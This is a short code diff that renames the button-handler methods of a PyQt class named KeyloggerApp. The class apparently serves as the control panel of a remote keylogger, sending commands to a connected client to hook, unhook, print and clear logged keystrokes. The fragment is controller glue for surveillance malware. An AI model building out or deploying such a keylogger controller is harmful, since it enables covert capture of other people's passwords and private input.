@@ -8,24 +8,24 @@ class KeyloggerApp(KeyloggerDesign):
     def __init__(self):
         super().__init__()
 
-    def on_btn_hook_click(self):
+    def onButtonHookClick(self):
         utils.write(gv.client, "keylog_hook()")
 
-    def on_btn_unhook_click(self):
+    def onButtonUnhookClick(self):
         utils.write(gv.client, "keylog_unhook()")
 
-    def on_btn_print_key_click(self):
+    def onButtonPrintKeyClick(self):
         utils.write(gv.client, "keylog_print()")
 
-        self.txt_result.setText(utils.read_str(gv.client))
+        self.txtOutput.setText(utils.read_str(gv.client))
 
-    def on_btn_clear_click(self):
+    def onButtonClearClick(self):
         utils.write(gv.client, "keylog_clear()")
 
-        self.txt_result.setText("")
+        self.txtOutput.setText("")
 
     def closeEvent(self, event):
-        self.on_btn_unhook_click()
+        self.onButtonUnhookClick()
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
